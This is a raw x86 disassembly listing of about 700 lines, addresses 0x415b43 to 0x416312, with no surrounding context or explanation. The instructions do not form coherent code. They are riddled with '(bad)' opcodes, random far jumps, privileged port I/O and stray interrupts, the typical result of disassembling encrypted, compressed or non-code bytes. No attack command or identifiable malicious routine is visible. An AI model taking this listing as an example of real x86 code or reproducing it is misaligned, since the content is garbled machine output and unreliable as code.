  415b43:	xchg   esp,eax
  415b44:	jge    0x415b1e
  415b46:	nop
  415b47:	mov    bh,0x7d
  415b49:	xor    eax,0xe4114fc1
  415b4e:	mov    dh,0xf1
  415b50:	sbb    al,0xaa
  415b52:	loop   0x415b39
  415b54:	push   ebx
  415b55:	xor    ebx,DWORD PTR [esp+ecx*4+0x3f]
  415b59:	or     DWORD PTR [esi-0x216d5263],esp
  415b5f:	jmp    0x415b0f
  415b61:	lds    eax,FWORD PTR [ebx]
  415b63:	repz xchg edx,eax
  415b65:	neg    BYTE PTR [edi-0x11a5c8ac]
  415b6b:	mov    al,ds:0xa90f040b
  415b70:	sbb    al,0x7e
  415b72:	mov    bl,0xef
  415b74:	dec    esi
  415b75:	dec    edi
  415b76:	jecxz  0x415b77
  415b78:	aas    
  415b79:	push   ebx
  415b7a:	fcomp  DWORD PTR [ebx]
  415b7c:	nop
  415b7d:	inc    edx
  415b7e:	call   FWORD PTR [ebx]
  415b80:	mov    edx,0x91ba096
  415b85:	mov    ch,0x21
  415b87:	pop    esp
  415b88:	shr    BYTE PTR [eax],cl
  415b8a:	das    
  415b8b:	mov    ds:0x5de3b7b,eax
  415b90:	pushf  
  415b91:	stos   DWORD PTR es:[edi],eax
  415b92:	jno    0x415b3b
  415b94:	sbb    esp,DWORD PTR [edx+edx*2+0xc]
  415b98:	iret   
  415b99:	inc    edi
  415b9a:	lea    esp,[edx-0x51]
  415b9d:	test   DWORD PTR [ecx],edi
  415b9f:	jo     0x415bbe
  415ba1:	pop    ebx
  415ba2:	idiv   DWORD PTR [edi-0x50]
  415ba5:	call   0x31dc:0xfa401727
  415bac:	adc    DWORD PTR [ebx+0x45eadf45],edx
  415bb2:	hlt    
  415bb3:	sbb    ebx,DWORD PTR [eax]
  415bb5:	xchg   esi,eax
  415bb6:	mov    eax,0x6c566a9f
  415bbb:	add    edx,DWORD PTR [edx-0x732f9f73]
  415bc1:	cmp    eax,0xe0d9364
  415bc6:	je     0x415bc9
  415bc8:	xor    DWORD PTR [ebx+0x28b7554f],edx
  415bce:	data16 sbb cl,ch
  415bd1:	ins    DWORD PTR es:[edi],dx
  415bd2:	imul   esp,edx,0xd5940728
  415bd8:	pop    esp
  415bd9:	dec    ebx
  415bda:	pop    ecx
  415bdb:	inc    ecx
  415bdc:	inc    ebp
  415bdd:	(bad)  [ebp+0x2f9af45a]
  415be3:	xor    eax,0x999d247f
  415be8:	mov    edx,DWORD PTR [edx-0x44]
  415beb:	cmp    BYTE PTR [ebx+ecx*8],al
  415bee:	sbb    al,0xd0
  415bf0:	mov    DWORD PTR ds:0x154f8755,esp
  415bf6:	add    DWORD PTR [edx-0x5bc1be9e],edi
  415bfc:	adc    al,0xe8
  415bfe:	ret    
  415bff:	arpl   WORD PTR [ebp+edx*1+0x1e],cx
  415c03:	sbb    al,BYTE PTR [eax+0x51aea0cb]
  415c09:	ss mov esp,gs
  415c0c:	mov    dh,0x6
  415c0e:	fnstcw WORD PTR [ebx-0x632f6122]
  415c14:	push   edx
  415c15:	leave  
  415c16:	data16 jnp 0x415ba9
  415c19:	test   eax,0xaaf8e707
  415c1e:	jns    0x415bc2
  415c20:	push   ss
  415c21:	or     eax,0xb286ebd6
  415c26:	cmp    al,0x28
  415c28:	push   ebx
  415c29:	sub    bl,BYTE PTR [ecx+ecx*4-0x5e]
  415c2d:	call   0xfdb18188
  415c32:	pop    eax
  415c33:	test   DWORD PTR [edi],esi
  415c35:	sub    ebp,DWORD PTR [eax+0x4d]
  415c38:	mov    al,ds:0x6f1fd7c
  415c3e:	sbb    bh,BYTE PTR [ebx+0x6]
  415c41:	pop    esi
  415c42:	add    edi,DWORD PTR [ecx]
  415c44:	test   al,0x11
  415c46:	call   0xfabdb741
  415c4b:	mov    ch,0x99
  415c4d:	xor    BYTE PTR [ecx],cl
  415c4f:	mov    ebp,DWORD PTR [eax+0x22dfbb97]
  415c55:	sub    al,0x20
  415c57:	mov    ebx,eax
  415c59:	xor    DWORD PTR [ecx+edx*4-0x1f166611],0xa
  415c61:	cli    
  415c62:	test   bh,0x1e
  415c65:	(bad)  
  415c66:	int    0x4c
  415c68:	(bad)  
  415c69:	fsub   QWORD PTR [eax]
  415c6b:	scas   al,BYTE PTR es:[edi]
  415c6c:	ds jl  0x415c3f
  415c6f:	mov    ebp,0xc8d02d07
  415c74:	int    0x35
  415c76:	bound  ecx,QWORD PTR [ecx+0xa]
  415c79:	cmp    eax,0x86f75ca0
  415c7e:	push   ecx
  415c7f:	test   BYTE PTR ds:0x5e0dcda8,bl
  415c85:	bound  esp,QWORD PTR ds:0x2beab45
  415c8b:	inc    edx
  415c8c:	xor    eax,0x33c47975
  415c91:	and    DWORD PTR [esi-0x10],ebx
  415c94:	cdq    
  415c95:	or     al,0x41
  415c97:	or     bh,ah
  415c99:	js     0x415c98
  415c9b:	enter  0x3fe9,0x68
  415c9f:	loope  0x415c61
  415ca1:	clc    
  415ca2:	fucomp st(4)
  415ca4:	jmp    0x6d38:0x86985d98
  415cab:	cld    
  415cac:	xor    al,0x7
  415cae:	mov    eax,ds:0x57354056
  415cb3:	cs adc al,0x6b
  415cb6:	repz mov al,0xe8
  415cb9:	push   esi
  415cba:	xchg   edx,eax
  415cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cbc:	cmp    edi,esp
  415cbe:	adc    eax,edi
  415cc0:	add    dl,BYTE PTR [esi+0x2a11d638]
  415cc6:	pop    es
  415cc7:	outs   dx,BYTE PTR ds:[esi]
  415cc8:	dec    ecx
  415cc9:	ins    BYTE PTR es:[edi],dx
  415cca:	xlat   BYTE PTR ds:[ebx]
  415ccb:	mov    ah,0xae
  415ccd:	shl    BYTE PTR [edx],1
  415ccf:	nop
  415cd0:	jmp    0xd2fb4f37
  415cd5:	daa    
  415cd6:	mov    bh,BYTE PTR [edx-0x1d]
  415cd9:	sub    DWORD PTR [ecx-0x3bd8a074],ebp
  415cdf:	retf   
  415ce0:	shl    BYTE PTR [esi],0xa0
  415ce3:	adc    al,cl
  415ce5:	jge    0x415d12
  415ce7:	(bad)  
  415ce8:	rcr    edx,1
  415cea:	rol    DWORD PTR [esi-0x4d],cl
  415ced:	cs aad 0xe7
  415cf0:	mov    ch,0xbb
  415cf2:	loopne 0x415cb6
  415cf4:	mov    WORD PTR [edi+edi*1+0x74b90da1],ss
  415cfb:	gs pop ebp
  415cfd:	cli    
  415cfe:	mov    BYTE PTR [ecx-0x40],ah
  415d01:	jmp    0x47f88cef
  415d06:	into   
  415d07:	mov    ch,0xa1
  415d09:	sub    BYTE PTR [ebx],bl
  415d0b:	dec    ebp
  415d0c:	lods   al,BYTE PTR ds:[esi]
  415d0d:	neg    edx
  415d0f:	fisub  WORD PTR [ebx+ebp*1]
  415d12:	outs   dx,BYTE PTR ds:[esi]
  415d13:	iret   
  415d14:	xchg   edx,eax
  415d15:	add    edi,edx
  415d17:	mov    ds:0xcfa70276,eax
  415d1c:	(bad)  
  415d1e:	mov    ecx,0x92084198
  415d23:	ja     0x415d04
  415d25:	and    eax,0xd634d7c3
  415d2a:	loope  0x415d9f
  415d2c:	inc    ecx
  415d2d:	jl     0x415d1c
  415d2f:	pusha  
  415d30:	mov    ebp,0xa5f19cae
  415d35:	jbe    0x415d52
  415d37:	pop    edi
  415d38:	mov    esi,0x82b54985
  415d3d:	clc    
  415d3e:	jb     0x415ccb
  415d40:	pop    ecx
  415d41:	inc    eax
  415d42:	fild   QWORD PTR [edx]
  415d44:	out    dx,al
  415d45:	sahf   
  415d46:	scas   eax,DWORD PTR es:[edi]
  415d47:	jecxz  0x415cdc
  415d49:	mov    bl,0x4b
  415d4b:	lea    ebp,[edx+0x571cc1cb]
  415d51:	test   eax,0xfbd46b0b
  415d56:	stos   DWORD PTR es:[edi],eax
  415d57:	popf   
  415d58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d59:	out    dx,eax
  415d5a:	pop    edx
  415d5b:	push   cs
  415d5c:	pop    esp
  415d5d:	cdq    
  415d5e:	xchg   ebp,eax
  415d5f:	push   0xffa4a387
  415d64:	mov    esi,0xdb823d3f
  415d69:	loopne 0x415d40
  415d6b:	xchg   esi,eax
  415d6c:	cwde   
  415d6d:	jo     0x415dc4
  415d6f:	js     0x415d7e
  415d71:	pushf  
  415d72:	mov    al,0xbc
  415d74:	jecxz  0x415d33
  415d76:	xchg   edi,eax
  415d77:	imul   ecx,DWORD PTR [eax+0x7d],0x3c
  415d7b:	into   
  415d7c:	xor    dl,bh
  415d7e:	in     al,dx
  415d7f:	push   ebx
  415d80:	imul   esp,DWORD PTR [edx+edi*4-0x3b0c7384],0xf0df74e7
  415d8b:	inc    ecx
  415d8c:	ins    BYTE PTR es:[edi],dx
  415d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d8e:	add    DWORD PTR [eax-0x17],edi
  415d91:	sbb    BYTE PTR [ebp-0xd],0x44
  415d95:	xor    ebp,edi
  415d97:	jmp    0x415d2a
  415d99:	add    al,BYTE PTR [edx]
  415d9b:	stc    
  415d9c:	pusha  
  415d9d:	sbb    ebx,DWORD PTR [ebp-0x3c276d]
  415da3:	add    BYTE PTR [edi+ebp*8+0x67af96dc],dh
  415daa:	push   cs
  415dab:	mov    al,BYTE PTR [edi+0x5d]
  415dae:	xchg   edi,ebp
  415db0:	loopne 0x415d3f
  415db2:	aad    0x43
  415db4:	adc    al,dl
  415db6:	or     bl,0xff
  415db9:	mov    dh,0x99
  415dbb:	into   
  415dbc:	in     al,0xe5
  415dbe:	pop    eax
  415dbf:	mov    bl,0x38
  415dc1:	mov    DWORD PTR [ebx-0x7ea1fb13],ebp
  415dc7:	add    dl,cl
  415dc9:	sub    dl,BYTE PTR [esi-0x58cb8224]
  415dcf:	pop    ebx
  415dd0:	jle    0x415d8c
  415dd2:	fsub   st,st(5)
  415dd4:	adc    DWORD PTR [ebx-0x34],edi
  415dd7:	call   0x50d0e9b6
  415ddc:	fild   DWORD PTR [esi+esi*1-0x55]
  415de0:	sub    bl,bh
  415de2:	xor    bh,BYTE PTR [ebx+0x5289cf7]
  415de8:	jbe    0x415df0
  415dea:	iret   
  415deb:	and    edx,edx
  415ded:	and    BYTE PTR [edx-0x1c84d124],dh
  415df3:	pop    edi
  415df4:	lahf   
  415df5:	enter  0x98ee,0x95
  415df9:	fistp  DWORD PTR [eax+0x6ef53fa5]
  415dff:	jns    0x415e4a
  415e01:	mov    esp,esp
  415e03:	mov    eax,ds:0xdbf18bc8
  415e08:	cs test dh,0xe5
  415e0c:	and    bh,cl
  415e0e:	lahf   
  415e0f:	mov    ss,WORD PTR [esi+0x7b]
  415e12:	xor    BYTE PTR [esi-0x40],ah
  415e15:	inc    eax
  415e16:	adc    ch,ch
  415e18:	daa    
  415e19:	imul   esp,DWORD PTR ds:0x51dd6d79,0x1d736721
  415e23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e24:	push   DWORD PTR [esi-0x7c]
  415e27:	lds    edi,FWORD PTR [esi-0x3aa39ead]
  415e2d:	fisttp QWORD PTR [ebx-0x21eb79bc]
  415e33:	xlat   BYTE PTR ds:[ebx]
  415e34:	jp     0x415e37
  415e36:	(bad)  
  415e37:	int3   
  415e38:	cmp    cl,0x77
  415e3b:	mov    edi,0x889ff15b
  415e40:	mov    eax,ds:0x5464515d
  415e45:	aad    0xb3
  415e47:	add    eax,0x1655f26d
  415e4c:	pop    edi
  415e4d:	in     eax,dx
  415e4e:	std    
  415e4f:	leave  
  415e50:	adc    ebx,edi
  415e52:	mov    esi,0xcb107fcd
  415e57:	pop    ebp
  415e58:	lahf   
  415e59:	adc    bl,bl
  415e5b:	ja     0x415e35
  415e5d:	jge    0x415eb9
  415e5f:	bound  esp,QWORD PTR [edx-0x4ec4dad3]
  415e65:	icebp  
  415e66:	sbb    eax,DWORD PTR [edi]
  415e68:	aas    
  415e69:	cmc    
  415e6a:	ret    0xda83
  415e6d:	sub    dh,BYTE PTR [ebx]
  415e6f:	retf   0xa119
  415e72:	inc    esi
  415e73:	mov    dl,BYTE PTR [eax+0xc]
  415e76:	cmp    bl,0x38
  415e79:	icebp  
  415e7a:	nop
  415e7b:	adc    al,0x89
  415e7d:	jbe    0x415e6a
  415e7f:	xchg   esi,eax
  415e80:	push   ecx
  415e81:	adc    DWORD PTR [eax],0xfffffff6
  415e84:	jo     0x415ebc
  415e86:	mov    WORD PTR [ebx+0x4a6104ed],fs
  415e8c:	cld    
  415e8d:	loop   0x415e62
  415e8f:	fistp  WORD PTR [ecx-0x1c]
  415e92:	sti    
  415e93:	iret   
  415e94:	pop    esp
  415e95:	sub    bl,BYTE PTR [ebp-0x66]
  415e98:	jmp    DWORD PTR [ecx+0x15]
  415e9b:	test   BYTE PTR [eax+0x4fef63de],0x91
  415ea2:	jnp    0x415e82
  415ea4:	jl     0x415ec5
  415ea6:	sub    bh,BYTE PTR [ecx-0x46]
  415ea9:	cmp    DWORD PTR [eax+0x63719ec2],ebp
  415eaf:	fiadd  WORD PTR [edx]
  415eb1:	sub    bh,BYTE PTR [ecx+0x69b352eb]
  415eb7:	jmp    0x7e28:0xbdc122de
  415ebe:	test   eax,0xfa906019
  415ec3:	mov    ds:0x4198eb74,al
  415ec8:	mov    WORD PTR [edi+0xb632852],?
  415ece:	dec    ecx
  415ecf:	mov    dl,ch
  415ed1:	jnp    0x415f1c
  415ed3:	pop    edx
  415ed4:	ins    DWORD PTR es:[edi],dx
  415ed5:	push   0xee221319
  415eda:	pop    ebx
  415edb:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  415edd:	jl     0x415eee
  415edf:	addr16 jg 0x415f35
  415ee2:	dec    ebx
  415ee3:	xchg   esi,eax
  415ee4:	cmp    ch,BYTE PTR [ebp+0x41082054]
  415eea:	popf   
  415eeb:	push   ebx
  415eec:	fild   WORD PTR [ecx+0x4eb58ff]
  415ef2:	push   eax
  415ef3:	stos   DWORD PTR es:[edi],eax
  415ef4:	sbb    BYTE PTR [esp+edx*2+0xf7aebcc],dh
  415efb:	push   esp
  415efc:	retf   
  415efd:	out    0x97,al
  415eff:	adc    cl,BYTE PTR [ebx+0xabe4eb8]
  415f05:	loopne 0x415e9b
  415f07:	loopne 0x415f42
  415f09:	mov    DWORD PTR [ecx+0x44],ebp
  415f0c:	daa    
  415f0d:	push   eax
  415f0e:	adc    dh,ch
  415f10:	push   es
  415f11:	mov    DWORD PTR [eax+0x5e],0x47c6b581
  415f18:	push   edx
  415f19:	or     esp,DWORD PTR [eax+ecx*2+0x60]
  415f1d:	jmp    0x73b5:0x99b76f37
  415f24:	jecxz  0x415f74
  415f26:	mov    edi,0x61ad471c
  415f2b:	imul   esi,DWORD PTR [edi],0xffffff9c
  415f2e:	(bad)  
  415f2f:	cli    
  415f30:	push   ebp
  415f31:	aam    0x23
  415f33:	popa   
  415f34:	cmp    ebx,0x9a479477
  415f3a:	aaa    
  415f3b:	stos   BYTE PTR es:[edi],al
  415f3c:	push   edx
  415f3d:	pop    ebp
  415f3e:	fidiv  WORD PTR [edx+0x1f795da]
  415f44:	call   0x9efbfe59
  415f49:	mov    edx,0x9f9122c9
  415f4e:	inc    ebx
  415f4f:	popa   
  415f50:	cmp    DWORD PTR [esi],esi
  415f52:	or     al,0x8b
  415f54:	shr    bh,0x2d
  415f57:	jmp    0x415f36
  415f59:	jge    0x415f66
  415f5b:	fist   DWORD PTR [edx+0x5561372f]
  415f61:	outs   dx,DWORD PTR ds:[esi]
  415f62:	xchg   esi,eax
  415f63:	mov    bl,0x73
  415f65:	test   eax,0xebdf7af3
  415f6a:	pop    edx
  415f6b:	call   0x50da:0xa460c6a2
  415f72:	and    BYTE PTR [edx],bh
  415f74:	sbb    DWORD PTR [esi+0x6d],0x6dede208
  415f7b:	retf   
  415f7c:	sub    bh,BYTE PTR [edi-0x3ce00e7]
  415f82:	scas   al,BYTE PTR es:[edi]
  415f83:	or     ecx,edi
  415f85:	scas   al,BYTE PTR es:[edi]
  415f86:	mov    esi,0xab8f098e
  415f8b:	cmp    BYTE PTR ds:0x1c9ef023,bh
  415f91:	inc    edx
  415f92:	repz mov cl,0x3a
  415f95:	jmp    0xdf97b105
  415f9a:	dec    ebp
  415f9b:	int    0x66
  415f9d:	jno    0x415ff4
  415f9f:	ret    
  415fa0:	loope  0x415f76
  415fa2:	mov    ecx,0x78978c07
  415fa7:	dec    edi
  415fa8:	inc    ebp
  415fa9:	cmp    DWORD PTR [edx-0x75603674],edi
  415faf:	outs   dx,BYTE PTR ds:[esi]
  415fb0:	push   0x18
  415fb2:	and    ebx,DWORD PTR [esi-0x66]
  415fb5:	pop    ss
  415fb6:	out    0x2d,al
  415fb8:	adc    eax,0x12ae1803
  415fbd:	sbb    eax,0x385de196
  415fc2:	rcr    BYTE PTR [esi-0x49],cl
  415fc5:	pop    ds
  415fc6:	aad    0x5c
  415fc8:	stos   BYTE PTR es:[edi],al
  415fc9:	mov    ds:0x398161cb,eax
  415fce:	or     ebp,DWORD PTR [esi-0x64]
  415fd1:	ret    
  415fd2:	push   ss
  415fd3:	ficom  WORD PTR [edi]
  415fd5:	popf   
  415fd6:	cmp    DWORD PTR [esi+0x35f9cb1e],ecx
  415fdc:	std    
  415fdd:	adc    BYTE PTR [edi],al
  415fdf:	stos   DWORD PTR es:[edi],eax
  415fe0:	push   ecx
  415fe1:	ret    0x1caa
  415fe4:	hlt    
  415fe5:	jl     0x416009
  415fe7:	mov    ?,WORD PTR [ecx-0x4160abd2]
  415fed:	jnp    0x41605f
  415fef:	inc    eax
  415ff0:	aam    0x89
  415ff2:	sub    eax,0x724b645f
  415ff7:	(bad)  
  415ff8:	jno    0x416071
  415ffa:	adc    BYTE PTR [ecx+0x2],dh
  415ffd:	enter  0x3358,0x31
  416001:	mov    ch,0xe2
  416003:	aad    0x34
  416005:	sbb    BYTE PTR [ebx+0x6e],dh
  416008:	rol    BYTE PTR [ebp+0x4e583937],0x3e
  41600f:	mov    ebp,0x8ea12edc
  416014:	and    BYTE PTR [eax+0x44914830],dh
  41601a:	xlat   BYTE PTR ds:[ebx]
  41601b:	add    edi,DWORD PTR [ebx+0x7c1317a7]
  416021:	xor    eax,0x336940de
  416026:	aaa    
  416027:	jl     0x416006
  416029:	fadd   QWORD PTR ds:[esi-0x5f1cfb2d]
  416030:	das    
  416031:	test   eax,0xa3d8e1f4
  416036:	push   ebx
  416037:	cmp    eax,DWORD PTR [edx-0x46]
  41603a:	sbb    bl,BYTE PTR [ecx-0x9]
  41603d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41603e:	mov    ecx,0x5de9be1e
  416043:	xchg   ebx,eax
  416044:	out    0x76,eax
  416046:	mov    ss,WORD PTR [edi-0x51ed339b]
  41604c:	mov    ecx,DWORD PTR [ebx+0x4a0949db]
  416052:	mov    bh,al
  416054:	add    eax,DWORD PTR [ebp-0x3c0402e]
  41605a:	dec    esi
  41605b:	ror    DWORD PTR [ebx+0xd],0xf3
  41605f:	(bad)  
  416060:	jp     0x416033
  416062:	or     dl,BYTE PTR [edi+0x20]
  416065:	fmul   st(2),st
  416067:	aam    0x60
  416069:	enter  0xbcb3,0x28
  41606d:	inc    ecx
  41606e:	lods   al,BYTE PTR ds:[esi]
  41606f:	xor    eax,0xfd05e604
  416074:	ror    ebp,1
  416076:	inc    edi
  416077:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416078:	das    
  416079:	(bad)  
  41607a:	aad    0xc5
  41607c:	xor    al,0xc9
  41607e:	imul   ebp,DWORD PTR [edi+0x3],0x38
  416082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416083:	out    dx,eax
  416084:	into   
  416085:	clc    
  416086:	or     eax,DWORD PTR [ebp-0x21ba5b3f]
  41608c:	jmp    0xe2fa:0x52fb086e
  416093:	leave  
  416094:	in     al,dx
  416095:	stos   DWORD PTR es:[edi],eax
  416096:	dec    esi
  416097:	in     eax,dx
  416098:	rcl    dl,cl
  41609a:	dec    eax
  41609b:	or     esi,DWORD PTR [eax-0x1d7361a0]
  4160a1:	inc    edx
  4160a2:	ins    BYTE PTR es:[edi],dx
  4160a3:	hlt    
  4160a4:	aaa    
  4160a5:	enter  0xa8be,0x43
  4160a9:	pop    ebp
  4160aa:	ins    BYTE PTR es:[edi],dx
  4160ab:	jmp    0x10a223de
  4160b0:	iret   
  4160b1:	pop    edx
  4160b2:	loope  0x416094
  4160b4:	push   ecx
  4160b5:	fcom   QWORD PTR [eax+0x60df762c]
  4160bb:	pusha  
  4160bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4160bd:	add    BYTE PTR [edi+0x38],bl
  4160c0:	fwait
  4160c1:	std    
  4160c2:	sbb    al,dl
  4160c4:	mov    cl,0xe1
  4160c6:	push   ebx
  4160c7:	clc    
  4160c8:	mov    DWORD PTR [ebx+0x6c],esi
  4160cb:	push   cs
  4160cc:	xchg   ebx,eax
  4160cd:	test   al,0xf
  4160cf:	std    
  4160d0:	mov    eax,ds:0xd6bb6487
  4160d5:	into   
  4160d6:	lahf   
  4160d7:	(bad)  
  4160d8:	jbe    0x41614a
  4160da:	sti    
  4160db:	mov    dh,0x4b
  4160dd:	push   ds
  4160de:	and    esi,0x755cbcc2
  4160e4:	sub    dl,dl
  4160e6:	sbb    bh,ah
  4160e8:	or     DWORD PTR [edx+esi*4+0x361c272d],edi
  4160ef:	cwde   
  4160f0:	pop    esp
  4160f1:	js     0x416159
  4160f3:	jge    0x4160b1
  4160f5:	and    eax,0x4b618cad
  4160fa:	loop   0x416118
  4160fc:	mov    ds:0x3f715027,eax
  416101:	jb     0x41616d
  416103:	inc    esp
  416104:	pop    ds
  416105:	push   cs
  416106:	push   ss
  416107:	push   ss
  416108:	sbb    ch,cl
  41610a:	push   0xb82140ea
  41610f:	and    ah,BYTE PTR [esi-0x68ef44e9]
  416115:	ins    DWORD PTR es:[edi],dx
  416116:	and    BYTE PTR ds:0x51cb158,0xd1
  41611d:	xchg   esi,eax
  41611e:	fldenv [eax]
  416120:	in     al,dx
  416121:	popa   
  416122:	loop   0x416129
  416124:	jnp    0x4160f6
  416126:	call   0xb63b41d9
  41612b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41612c:	frstor [edi-0x35]
  41612f:	mov    al,ds:0xad1cc6c7
  416134:	out    dx,eax
  416135:	cmp    ebp,DWORD PTR [eax]
  416137:	sbb    al,0x44
  416139:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41613a:	fs mov eax,0xe9a1b6e4
  416140:	pmullw mm6,mm7
  416143:	pop    esp
  416144:	clc    
  416145:	xchg   esi,eax
  416146:	cmp    dl,cl
  416148:	stos   DWORD PTR es:[edi],eax
  416149:	push   cs
  41614a:	mov    ecx,0x828902fe
  41614f:	dec    esp
  416150:	fisttp QWORD PTR [edx]
  416152:	jg     0x4161c1
  416154:	xchg   ebp,eax
  416155:	nop
  416156:	fld    TBYTE PTR [ebp-0x75]
  416159:	lock fsubr QWORD PTR [eax-0x7d]
  41615d:	outs   dx,DWORD PTR ds:[esi]
  41615e:	and    DWORD PTR [ebp+0x7a77bfa9],ecx
  416164:	cli    
  416165:	ret    0x3f3d
  416168:	sub    BYTE PTR [edi],0xae
  41616b:	xchg   ebp,eax
  41616c:	arpl   WORD PTR [ecx],si
  41616e:	and    ah,dh
  416170:	retf   
  416171:	xchg   ecx,eax
  416172:	push   edx
  416173:	fwait
  416174:	mov    eax,DWORD PTR [edi-0x5d]
  416177:	loop   0x416138
  416179:	mov    WORD PTR [ecx-0x15abea16],ss
  41617f:	cdq    
  416180:	gs jbe 0x41614a
  416183:	xchg   esp,eax
  416184:	(bad)  
  416185:	arpl   WORD PTR [esi],bp
  416187:	in     al,dx
  416188:	mov    esi,0x3f24c141
  41618d:	and    cl,BYTE PTR ds:0x93e84cf9
  416193:	popf   
  416194:	push   DWORD PTR [ecx+0x1ec17685]
  41619a:	xor    esi,DWORD PTR [ebp+0x5c99daf7]
  4161a0:	lods   al,BYTE PTR ds:[esi]
  4161a1:	xor    esp,DWORD PTR [ebx-0x1c]
  4161a4:	popa   
  4161a5:	push   eax
  4161a6:	sahf   
  4161a7:	mov    dh,0xab
  4161a9:	jae    0x4161ed
  4161ab:	fwait
  4161ac:	sbb    al,BYTE PTR [eax-0x5d]
  4161af:	loopne 0x416150
  4161b1:	jl     0x4161fc
  4161b3:	cmp    BYTE PTR [ebp+0xa6d9793],0x8c
  4161ba:	dec    eax
  4161bb:	retf   0x24eb
  4161be:	pop    eax
  4161bf:	je     0x41618d
  4161c1:	push   esi
  4161c2:	cmp    esp,esi
  4161c4:	test   BYTE PTR [ecx-0x7fdd52e4],bl
  4161ca:	test   al,0x36
  4161cc:	call   0x971053ae
  4161d1:	lea    ebx,[ebx-0x5413ecb2]
  4161d7:	fild   WORD PTR [eax+0x6c]
  4161da:	jne    0x41615c
  4161dc:	or     ebp,edx
  4161de:	int    0x9e
  4161e0:	loop   0x41619b
  4161e2:	(bad)  
  4161e3:	ss push esi
  4161e5:	cmp    al,dh
  4161e7:	out    0x36,eax
  4161e9:	retf   0x9db0
  4161ec:	sub    esp,DWORD PTR [ebx]
  4161ee:	mov    ebp,0x660356ce
  4161f3:	jp     0x416274
  4161f5:	in     eax,dx
  4161f6:	(bad)  
  4161f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161f8:	sbb    eax,0x73802edd
  4161fd:	or     BYTE PTR [edx+0x45326ef0],0x9a
  416204:	add    esp,DWORD PTR [ebx+0x50]
  416207:	mov    ds:0xa3805eaa,eax
  41620c:	out    dx,al
  41620d:	out    0xbf,al
  41620f:	out    dx,al
  416210:	mov    esi,0xe68e0106
  416215:	sub    ebp,DWORD PTR ds:0x5e96fcc1
  41621b:	retf   
  41621c:	xlat   BYTE PTR ds:[ebx]
  41621d:	les    edi,FWORD PTR [esi]
  41621f:	adc    al,0x3
  416221:	xor    ah,BYTE PTR [eax]
  416223:	mov    ds:0xda637345,eax
  416228:	cmp    eax,0xb7435e23
  41622d:	sti    
  41622e:	out    0xbd,eax
  416230:	aas    
  416231:	add    DWORD PTR [ecx+esi*2],esi
  416234:	and    dl,BYTE PTR [edx+esi*1+0x2c87d3c7]
  41623b:	pushf  
  41623c:	mov    dl,0x6b
  41623e:	repz inc esi
  416240:	cmc    
  416241:	stos   BYTE PTR es:[edi],al
  416242:	loope  0x41627f
  416244:	lea    ebp,ds:[esi]
  416247:	push   edx
  416248:	shl    DWORD PTR [edx-0x4c],cl
  41624b:	jnp    0x4162ae
  41624d:	adc    edx,DWORD PTR [ebx+0x3ffb356d]
  416253:	pusha  
  416254:	mov    eax,0x6c41be8f
  416259:	cld    
  41625a:	pop    esp
  41625b:	dec    ebp
  41625c:	repz stc 
  41625e:	adc    BYTE PTR [ebx],dh
  416260:	cs (bad) 
  416262:	mov    ecx,0xcf8a7b3b
  416267:	pusha  
  416268:	sar    DWORD PTR [esi-0x1a0d5a20],cl
  41626e:	mov    ecx,0xf582b72b
  416273:	dec    edi
  416274:	sti    
  416275:	xchg   ecx,eax
  416276:	add    eax,DWORD PTR [ecx-0x77]
  416279:	cmp    al,0x79
  41627b:	mov    cl,0xf0
  41627d:	jns    0x4162c1
  41627f:	mov    eax,esp
  416281:	sub    al,0xa2
  416283:	push   edx
  416284:	(bad)  
  416285:	test   BYTE PTR [ecx+esi*1],0x67
  416289:	lds    edx,FWORD PTR [eax+0x4a]
  41628c:	ins    BYTE PTR es:[edi],dx
  41628d:	cli    
  41628e:	xor    esp,DWORD PTR [esi+0x61d8183d]
  416294:	(bad)  
  416295:	jns    0x4162c2
  416297:	in     eax,0xda
  416299:	in     eax,dx
  41629a:	daa    
  41629b:	daa    
  41629c:	imul   edi,DWORD PTR [edx],0x34
  41629f:	add    eax,0x7318ef0d
  4162a4:	fild   QWORD PTR [edi-0x2339842f]
  4162aa:	loope  0x41623a
  4162ac:	pushf  
  4162ad:	jnp    0x416232
  4162af:	push   edx
  4162b0:	add    DWORD PTR [edx],esp
  4162b2:	das    
  4162b3:	lea    ecx,[ebp-0x36]
  4162b6:	(bad)  
  4162b7:	cmp    BYTE PTR [edi-0x3d],ah
  4162ba:	xchg   esp,eax
  4162bb:	mov    ds:0xd1b45ef,al
  4162c0:	jmp    0x416292
  4162c2:	add    BYTE PTR [edi],ch
  4162c4:	fwait
  4162c5:	lods   eax,DWORD PTR ds:[si]
  4162c7:	push   es
  4162c8:	pop    ecx
  4162c9:	inc    esi
  4162ca:	or     al,0x27
  4162cc:	or     dh,ch
  4162ce:	adc    dh,BYTE PTR [esi]
  4162d0:	aas    
  4162d1:	dec    ebx
  4162d2:	aad    0x19
  4162d4:	mov    eax,0x4a0b09b0
  4162d9:	jne    0x4162d2
  4162db:	sub    al,0xe6
  4162dd:	test   BYTE PTR gs:[edi],ch
  4162e0:	(bad)  
  4162e1:	mov    BYTE PTR [ebp-0x43],bh
  4162e4:	aas    
  4162e5:	inc    edx
  4162e6:	or     dl,al
  4162e8:	jmp    0x8b88:0xb68a27ec
  4162ef:	loopne 0x4162cb
  4162f1:	cli    
  4162f2:	push   ds
  4162f3:	inc    esp
  4162f4:	ins    BYTE PTR es:[edi],dx
  4162f5:	xchg   edx,eax
  4162f6:	outs   dx,DWORD PTR ds:[esi]
  4162f7:	fisub  WORD PTR ss:[edi+ecx*2-0x4]
  4162fc:	das    
  4162fd:	fisubr WORD PTR [edi+0x43256f45]
  416303:	retf   
  416304:	fwait
  416305:	xchg   ecx,eax
  416306:	or     eax,0xf31eabbb
  41630b:	and    eax,0xce67ff51
  416310:	int    0xc7
  416312:	shl    BYTE PTR [eax+0x45127b94],0x99
